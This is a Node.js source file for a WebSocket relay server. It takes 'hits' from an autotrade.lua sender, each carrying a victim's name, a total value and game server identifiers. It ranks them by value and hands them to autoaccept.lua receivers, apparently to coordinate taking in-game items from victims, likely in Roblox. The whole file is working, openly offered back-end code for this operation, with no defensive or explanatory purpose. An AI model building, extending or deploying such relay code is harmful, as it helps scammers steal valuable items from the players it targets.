// ============================================================
// relay.js  —  Cloud WebSocket relay (Railway)
//
// Changes in this version:
//   - Hit queue is VALUE-SORTED (highest totalValue first).
//     Ties broken by arrival time (earlier = higher priority).
//   - Hits that arrive already Claimed or Missed are rejected
//     immediately — never enter the queue.
//   - New message type "status_update": autotrade.lua sends
//     this whenever the victim's status changes. Relay:
//       • Forwards it to all receivers so they can react
//       • If the active job matches and status is Claimed or
//         Missed, clears activeJob and dispatches next
//       • If a queued job matches, removes it from the queue
//   - Hit payload now carries: jobId, placeId, victimName,
//     totalValue, status ("Waiting" at broadcast time)
// ============================================================

const { WebSocketServer } = require("ws");
const http = require("http");

const SECRET = process.env.RELAY_SECRET || "changeme";
const PORT   = parseInt(process.env.PORT || "8765", 10);

// ── State ────────────────────────────────────────────────────
const senders   = new Set();
const receivers = new Set();

// Value-sorted queue — highest totalValue first.
// Each entry: { jobId, placeId, victimName, totalValue, status, queuedAt }
const hitQueue  = [];
let   activeJob      = null;
let   activeReceiver = null;

// ── HTTP server + health check ────────────────────────────────
const server = http.createServer((req, res) => {
    if (req.method === "GET" && req.url === "/") {
        const status = {
            ok        : true,
            uptime    : Math.floor(process.uptime()),
            queue     : hitQueue.map(h => ({
                jobId      : h.jobId,
                victimName : h.victimName,
                totalValue : h.totalValue,
                status     : h.status,
            })),
            activeJob : activeJob ? {
                jobId      : activeJob.jobId,
                victimName : activeJob.victimName,
                totalValue : activeJob.totalValue,
                status     : activeJob.status,
            } : null,
            senders   : senders.size,
            receivers : receivers.size,
        };
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify(status));
    } else {
        res.writeHead(404);
        res.end();
    }
});

const wss = new WebSocketServer({ server });

// ── Helpers ──────────────────────────────────────────────────
function send(ws, obj) {
    if (ws && ws.readyState === 1) ws.send(JSON.stringify(obj));
}

function log(tag, msg) {
    const ts = new Date().toISOString().slice(11, 23);
    console.log(`[${ts}] [${tag}] ${msg}`);
}

// Insert hit into queue maintaining descending value order.
// Ties broken by queuedAt ascending (earlier arrival = higher priority).
function enqueue(hit) {
    let i = 0;
    while (i < hitQueue.length) {
        const existing = hitQueue[i];
        if (hit.totalValue > existing.totalValue) break;
        if (hit.totalValue === existing.totalValue && hit.queuedAt < existing.queuedAt) break;
        i++;
    }
    hitQueue.splice(i, 0, hit);
}

function dispatchNext() {
    if (activeJob) return;
    if (hitQueue.length === 0) return;
    let target = null;
    for (const r of receivers) {
        if (r.readyState === 1) { target = r; break; }
    }
    if (!target) {
        log("RELAY", `Queue has ${hitQueue.length} hit(s) — waiting for receiver`);
        return;
    }
    activeJob      = hitQueue.shift();
    activeReceiver = target;
    log("DISPATCH", `Job ${activeJob.jobId} (${activeJob.victimName} val:${activeJob.totalValue}) → receiver (${hitQueue.length} remaining)`);
    send(target, { type: "hit", ...activeJob });
}

// Broadcast a status_update to all receivers
function broadcastStatusUpdate(jobId, status, victimName, totalValue) {
    const payload = { type: "status_update", jobId, status, victimName, totalValue };
    for (const r of receivers) send(r, payload);
    log("STATUS", `${jobId} → ${status} (${victimName}, val:${totalValue})`);
}

// ── Heartbeat ─────────────────────────────────────────────────
setInterval(() => {
    for (const ws of [...senders, ...receivers]) {
        if (!ws.isAlive) {
            ws.terminate();
            senders.delete(ws);
            receivers.delete(ws);
            continue;
        }
        ws.isAlive = false;
        ws.ping();
    }
}, 30_000);

// ── Connection handler ────────────────────────────────────────
wss.on("connection", (ws, req) => {
    const ip = req.socket.remoteAddress;
    ws.isAlive = true;
    ws.on("pong", () => { ws.isAlive = true; });
    log("CONNECT", `New connection from ${ip}`);

    const authTimeout = setTimeout(() => {
        if (!ws.role) {
            log("AUTH", `No registration within 5s from ${ip} — closing`);
            ws.close(4001, "auth timeout");
        }
    }, 5000);

    ws.on("message", (raw) => {
        let msg;
        try { msg = JSON.parse(raw.toString()); }
        catch { return; }

        // ── Registration ──────────────────────────────────────
        if (msg.type === "register") {
            if (msg.secret !== SECRET) {
                log("AUTH", `Wrong secret from ${ip} — closing`);
                ws.close(4003, "invalid secret");
                return;
            }
            clearTimeout(authTimeout);
            ws.role = msg.role;

            if (msg.role === "sender") {
                senders.add(ws);
                log("SENDER", `Registered from ${ip} (${senders.size} total)`);
                send(ws, { type: "registered", role: "sender" });
            }
            if (msg.role === "receiver") {
                receivers.add(ws);
                log("RECEIVER", `Registered from ${ip} (${receivers.size} total)`);
                send(ws, { type: "registered", role: "receiver" });
                dispatchNext();
            }
            return;
        }

        if (!ws.role) { ws.close(4001, "not registered"); return; }

        // ── Hit (from autotrade.lua) ──────────────────────────
        if (msg.type === "hit" && ws.role === "sender") {
            const status = msg.status || "Waiting";

            // Reject immediately if already terminal
            if (status === "Claimed" || status === "Missed") {
                log("REJECT", `Hit ${msg.jobId} already ${status} — not queuing`);
                send(ws, { type: "hit_ack", jobId: msg.jobId, rejected: true, reason: status });
                return;
            }

            // Require at least 1 value to be worth joining
            const val = typeof msg.totalValue === "number" ? msg.totalValue : 0;
            if (val < 1) {
                log("REJECT", `Hit ${msg.jobId} value ${val} < 1 — not queuing`);
                send(ws, { type: "hit_ack", jobId: msg.jobId, rejected: true, reason: "no_value" });
                return;
            }

            const hit = {
                jobId      : msg.jobId,
                placeId    : msg.placeId,
                victimName : msg.victimName,
                totalValue : val,
                status     : status,
                queuedAt   : Date.now(),
            };
            enqueue(hit);
            const pos = hitQueue.indexOf(hit) + 1;
            log("HIT", `Queued ${hit.jobId} (${hit.victimName} val:${val}) — pos ${pos} of ${hitQueue.length}`);
            send(ws, { type: "hit_ack", jobId: hit.jobId, queuePosition: pos, totalValue: val });
            dispatchNext();
            return;
        }

        // ── Status update (from autotrade.lua) ───────────────
        // Autotrade sends this when status changes: Waiting→InProgress→Claimed/Missed/Partial
        if (msg.type === "status_update" && ws.role === "sender") {
            const { jobId, status, victimName, totalValue } = msg;
            log("STATUS_IN", `${jobId} → ${status}`);

            // Forward to all receivers
            broadcastStatusUpdate(jobId, status, victimName, totalValue);

            const isTerminal = (status === "Claimed" || status === "Missed" || status === "Partial");

            // If this is the active job going terminal, clear and dispatch next
            if (activeJob && activeJob.jobId === jobId && isTerminal) {
                log("TERMINAL", `Active job ${jobId} → ${status} — clearing`);
                // Update status on active job for logging
                activeJob.status = status;
                activeJob = null;
                activeReceiver = null;
                dispatchNext();
            }

            // If a queued job goes terminal, remove it from queue
            const qi = hitQueue.findIndex(h => h.jobId === jobId);
            if (qi !== -1 && isTerminal) {
                log("DEQUEUE", `Removing terminal job ${jobId} (${status}) from queue`);
                hitQueue.splice(qi, 1);
            }

            // Update status on queued job if not terminal (e.g. InProgress)
            if (qi !== -1 && !isTerminal) {
                hitQueue[qi].status = status;
            }

            return;
        }

        // ── Claimed (from autoaccept.lua) ─────────────────────
        if (msg.type === "claimed" && ws.role === "receiver") {
            log("CLAIMED", `Job ${msg.jobId} complete`);
            if (activeJob && activeJob.jobId === msg.jobId) {
                activeJob = null; activeReceiver = null;
            } else {
                log("WARN", `claimed ${msg.jobId} != active ${activeJob?.jobId}`);
            }
            for (const s of senders) send(s, { type: "claimed_ack", jobId: msg.jobId });
            dispatchNext();
            return;
        }

        // ── Skip (from autoaccept.lua) ────────────────────────
        // Skip does NOT requeue — just moves on to next
        if (msg.type === "skip" && ws.role === "receiver") {
            log("SKIP", `Job ${msg.jobId} skipped — moving to next`);
            if (activeJob && activeJob.jobId === msg.jobId) {
                activeJob = null; activeReceiver = null;
            }
            dispatchNext();
            return;
        }
    });

    ws.on("close", () => {
        senders.delete(ws);
        receivers.delete(ws);
        log("DISCONNECT", `${ws.role || "unregistered"} from ${ip}`);
        if (ws === activeReceiver && activeJob) {
            log("RECOVERY", `Receiver dropped — pushing ${activeJob.jobId} back to front`);
            // Re-insert at correct value position rather than forcing front
            const recovered = { ...activeJob, queuedAt: Date.now() - 1_000_000 }; // old time = high priority
            activeJob = null; activeReceiver = null;
            enqueue(recovered);
            dispatchNext();
        }
    });

    ws.on("error", (err) => log("ERROR", `${ws.role || "?"}: ${err.message}`));
});

server.listen(PORT, () => {
    log("RELAY", `Running on port ${PORT}`);
    log("RELAY", `Secret: ${SECRET === "changeme" ? "⚠️  DEFAULT — set RELAY_SECRET in env!" : "✅ set"}`);
});
